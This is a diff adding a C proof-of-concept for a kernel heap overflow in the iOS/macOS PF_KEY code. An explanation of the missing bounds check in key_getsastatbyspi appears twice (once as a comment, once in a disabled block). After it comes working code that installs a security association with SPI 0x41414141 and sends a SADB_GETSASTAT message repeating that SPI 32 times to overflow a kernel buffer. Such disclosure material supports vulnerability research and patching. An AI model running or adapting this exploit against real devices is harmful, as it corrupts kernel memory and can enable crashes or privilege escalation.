@@ -1,0 +1,351 @@
+/*
+Inspired by Ned Williamsons's fuzzer I took a look at the netkey code.
+
+key_getsastat handles SADB_GETSASTAT messages:
+
+It allocates a buffer based on the number of SAs there currently are:
+
+  bufsize = (ipsec_sav_count + 1) * sizeof(*sa_stats_sav);
+    
+  KMALLOC_WAIT(sa_stats_sav, __typeof__(sa_stats_sav), bufsize);
+
+It the retrieves the list of SPIs we are querying for, and the length of that list:
+
+  sa_stats_arg = (__typeof__(sa_stats_arg))(void *)mhp->ext[SADB_EXT_SASTAT];
+
+  arg_count = sa_stats_arg->sadb_sastat_list_len;
+
+  // exit early if there are no requested SAs
+  if (arg_count == 0) {
+    printf("%s: No SAs requested.\n", __FUNCTION__);
+    error = ENOENT;
+    goto end;
+  }
+  res_count = 0;
+
+It passes those, and the allocated buffer, to key_getsastatbyspi:
+
+  if (key_getsastatbyspi((struct sastat *)(sa_stats_arg + 1),
+                         arg_count,
+                         sa_stats_sav,
+                         &res_count)) {
+
+The is immediately suspicious because we're passing the sa_stats_sav buffer in, but not its length...
+
+Looking at key_getsastatbyspi:
+
+  static int
+  key_getsastatbyspi (struct sastat *stat_arg,
+                      u_int32_t      max_stat_arg,
+                      struct sastat *stat_res,
+                      u_int32_t     *max_stat_res)
+  {
+    int cur, found = 0;
+
+    if (stat_arg == NULL ||
+        stat_res == NULL ||
+        max_stat_res == NULL) {
+      return -1;
+    }
+
+    for (cur = 0; cur < max_stat_arg; cur++) {
+      if (key_getsastatbyspi_one(stat_arg[cur].spi,
+                                 &stat_res[found]) == 0) {
+        found++;
+      }
+    }
+    *max_stat_res = found;
+
+    if (found) {
+      return 0;
+    }
+    return -1;
+  }
+
+Indeed, each time a spi match is found we increment found and can go past the end of the stat_res buffer.
+
+Triggering this requires you to load a valid SA with a known SPI (here 0x41414141) then send a SADB_GETSASTAT
+containing multiple requests for that same, valid SPI.
+
+Tested on MacOS 10.14.2 (18C54)
+*/
+
+// @i41nbeer
+
+#if 0
+iOS/MacOS kernel heap overflow in PF_KEY due to lack of bounds checking when retrieving statistics
+
+Inspired by Ned Williamsons's fuzzer I took a look at the netkey code.
+
+key_getsastat handles SADB_GETSASTAT messages:
+
+It allocates a buffer based on the number of SAs there currently are:
+
+  bufsize = (ipsec_sav_count + 1) * sizeof(*sa_stats_sav);
+    
+  KMALLOC_WAIT(sa_stats_sav, __typeof__(sa_stats_sav), bufsize);
+
+It the retrieves the list of SPIs we are querying for, and the length of that list:
+
+  sa_stats_arg = (__typeof__(sa_stats_arg))(void *)mhp->ext[SADB_EXT_SASTAT];
+
+  arg_count = sa_stats_arg->sadb_sastat_list_len;
+
+  // exit early if there are no requested SAs
+  if (arg_count == 0) {
+    printf("%s: No SAs requested.\n", __FUNCTION__);
+    error = ENOENT;
+    goto end;
+  }
+  res_count = 0;
+
+It passes those, and the allocated buffer, to key_getsastatbyspi:
+
+  if (key_getsastatbyspi((struct sastat *)(sa_stats_arg + 1),
+                         arg_count,
+                         sa_stats_sav,
+                         &res_count)) {
+
+The is immediately suspicious because we're passing the sa_stats_sav buffer in, but not its length...
+
+Looking at key_getsastatbyspi:
+
+  static int
+  key_getsastatbyspi (struct sastat *stat_arg,
+                      u_int32_t      max_stat_arg,
+                      struct sastat *stat_res,
+                      u_int32_t     *max_stat_res)
+  {
+    int cur, found = 0;
+
+    if (stat_arg == NULL ||
+        stat_res == NULL ||
+        max_stat_res == NULL) {
+      return -1;
+    }
+
+    for (cur = 0; cur < max_stat_arg; cur++) {
+      if (key_getsastatbyspi_one(stat_arg[cur].spi,
+                                 &stat_res[found]) == 0) {
+        found++;
+      }
+    }
+    *max_stat_res = found;
+
+    if (found) {
+      return 0;
+    }
+    return -1;
+  }
+
+Indeed, each time a spi match is found we increment found and can go past the end of the stat_res buffer.
+
+Triggering this requires you to load a valid SA with a known SPI (here 0x41414141) then send a SADB_GETSASTAT
+containing multiple requests for that same, valid SPI.
+
+Tested on MacOS 10.14.2 (18C54)
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <net/pfkeyv2.h>
+
+#if 0
+struct sadb_msg {
+  u_int8_t sadb_msg_version;
+  u_int8_t sadb_msg_type;
+  u_int8_t sadb_msg_errno;
+  u_int8_t sadb_msg_satype;
+  u_int16_t sadb_msg_len;         // in 8-byte units
+  u_int16_t sadb_msg_reserved;
+  u_int32_t sadb_msg_seq;
+  u_int32_t sadb_msg_pid;
+};
+
+// extenstion header
+
+struct sadb_ext {
+  u_int16_t sadb_ext_len;        // 8-byte units
+  u_int16_t sadb_ext_type;
+};
+
+// SADB_EXT_SA
+
+struct sadb_sa {
+  u_int16_t sadb_sa_len;
+  u_int16_t sadb_sa_exttype;
+  u_int32_t sadb_sa_spi;
+  u_int8_t sadb_sa_replay;
+  u_int8_t sadb_sa_state;
+  u_int8_t sadb_sa_auth;
+  u_int8_t sadb_sa_encrypt;
+  u_int32_t sadb_sa_flags;
+};
+
+// SADB_EXT_ADDRESS_SRC/DST
+// is this variable sized?
+
+struct sadb_address {
+  u_int16_t sadb_address_len;
+  u_int16_t sadb_address_exttype;
+  u_int8_t sadb_address_proto;
+  u_int8_t sadb_address_prefixlen;
+  u_int16_t sadb_address_reserved;
+};
+
+// SADB_EXT_KEY_AUTH header
+
+struct sadb_key {
+  u_int16_t sadb_key_len;       
+  u_int16_t sadb_key_exttype;
+  u_int16_t sadb_key_bits;      // >> 3 -> bzero
+  u_int16_t sadb_key_reserved;
+};
+
+// SADB_EXT_SASTAT
+
+struct sadb_sastat {
+        u_int16_t            sadb_sastat_len;
+        u_int16_t            sadb_sastat_exttype;
+        u_int32_t            sadb_sastat_dir;
+        u_int32_t            sadb_sastat_reserved;
+        u_int32_t            sadb_sastat_list_len;
+        /* list of struct sastat comes after */
+} __attribute__ ((aligned(8)));
+
+struct sastat {
+        u_int32_t            spi;               /* SPI Value, network byte order */
+        u_int32_t            created;           /* for lifetime */
+        struct sadb_lifetime lft_c;             /* CURRENT lifetime. */
+}; // no need to align
+
+#endif
+
+
+struct my_msg {
+  struct sadb_msg hdr;
+
+  // required options
+  struct sadb_sa sa;  // SADB_EXT_SA
+
+  struct sadb_address address_src; // SADB_EXT_ADDRESS_SRC
+  struct sockaddr_in sockaddr_src; // 0x10 bytes
+  struct sadb_address address_dst; // SADB_EXT_ADDRESS_DST
+  struct sockaddr_in sockaddr_dst; // 0x10 bytes
+
+  struct sadb_key key;
+  char key_material[128/8];
+};
+
+#define N_LIST_ENTRIES 32
+struct stat_msg {
+  struct sadb_msg hdr;
+  struct sadb_session_id sid;
+  struct sadb_sastat stat;
+  struct sastat list[N_LIST_ENTRIES];
+};
+
+int main() {
+  // get a PF_KEY socket:
+  int fd = socket(PF_KEY, SOCK_RAW, PF_KEY_V2);
+  if (fd == -1) {
+    perror("failed to get PF_KEY socket, got privs?");
+    return 0;
+  }
+
+  printf("got PF_KEY socket: %d\n", fd);
+
+  struct my_msg* msg = malloc(sizeof(struct my_msg));
+  memset(msg, 0, sizeof(struct my_msg));
+
+  msg->hdr.sadb_msg_version = PF_KEY_V2;
+  msg->hdr.sadb_msg_type = SADB_ADD;
+
+  msg->hdr.sadb_msg_satype = SADB_SATYPE_AH;
+  
+  msg->hdr.sadb_msg_len = sizeof(struct my_msg) >> 3;
+  msg->hdr.sadb_msg_pid = getpid();
+
+  // SADB_EXT_SA
+  msg->sa.sadb_sa_len = sizeof(msg->sa) >> 3;
+  msg->sa.sadb_sa_exttype = SADB_EXT_SA;
+
+  // we need to fill in the fields correctly as we need at least one valid key 
+  msg->sa.sadb_sa_spi = 0x41414141;
+
+  msg->sa.sadb_sa_auth = SADB_AALG_MD5HMAC; // sav->alg_auth, which alg
+  // -> 128 bit key size
+
+  // SADB_EXT_ADDRESS_SRC
+  msg->address_src.sadb_address_len = (sizeof(msg->address_src) + sizeof(msg->sockaddr_src)) >> 3;
+  msg->address_src.sadb_address_exttype = SADB_EXT_ADDRESS_SRC;
+
+  msg->sockaddr_src.sin_len = 0x10;
+  msg->sockaddr_src.sin_family = AF_INET;
+  msg->sockaddr_src.sin_port = 4141;
+  inet_pton(AF_INET, "10.10.10.10", &msg->sockaddr_src.sin_addr);
+
+
+  // SADB_EXT_ADDRESS_DST
+  msg->address_dst.sadb_address_len = (sizeof(msg->address_dst) + sizeof(msg->sockaddr_dst)) >> 3;
+  msg->address_dst.sadb_address_exttype = SADB_EXT_ADDRESS_DST;
+
+  msg->sockaddr_dst.sin_len = 0x10;
+  msg->sockaddr_dst.sin_family = AF_INET;
+  msg->sockaddr_dst.sin_port = 4242;
+  inet_pton(AF_INET, "10.10.10.10", &msg->sockaddr_dst.sin_addr);
+
+  msg->key.sadb_key_exttype = SADB_EXT_KEY_AUTH;
+  msg->key.sadb_key_len = (sizeof(struct sadb_key) + sizeof(msg->key_material)) >> 3;
+  msg->key.sadb_key_bits = 128;
+
+  size_t amount_to_send = msg->hdr.sadb_msg_len << 3;
+  printf("trying to write %zd bytes\n", amount_to_send);
+  ssize_t written = write(fd, msg, amount_to_send);
+  printf("written: %zd\n", written);
+
+
+  
+  struct stat_msg * smsg = malloc(sizeof(struct stat_msg));
+  memset(smsg, 0, sizeof(struct stat_msg));
+
+  smsg->hdr.sadb_msg_version = PF_KEY_V2;
+  smsg->hdr.sadb_msg_type = SADB_GETSASTAT;
+
+  smsg->hdr.sadb_msg_satype = SADB_SATYPE_AH;
+  
+  smsg->hdr.sadb_msg_len = sizeof(struct stat_msg) >> 3;
+  smsg->hdr.sadb_msg_pid = getpid();
+
+  // SADB_EXT_SESSION_ID
+  smsg->sid.sadb_session_id_len = sizeof(struct sadb_session_id) >> 3;
+  smsg->sid.sadb_session_id_exttype = SADB_EXT_SESSION_ID;
+
+  // SADB_EXT_SASTAT
+  smsg->stat.sadb_sastat_len = (sizeof(struct sadb_sastat) + sizeof(smsg->list)) >> 3;
+  smsg->stat.sadb_sastat_exttype = SADB_EXT_SASTAT;
+
+  smsg->stat.sadb_sastat_list_len = N_LIST_ENTRIES;
+
+  for (int i = 0; i < N_LIST_ENTRIES; i++) {
+    smsg->list[i].spi = 0x41414141;
+  }
+
+
+  amount_to_send = smsg->hdr.sadb_msg_len << 3;
+  printf("trying to write %zd bytes\n", amount_to_send);
+  written = write(fd, smsg, amount_to_send);
+  printf("written: %zd\n", written);
+
+
+
+
+  return 0;
+}
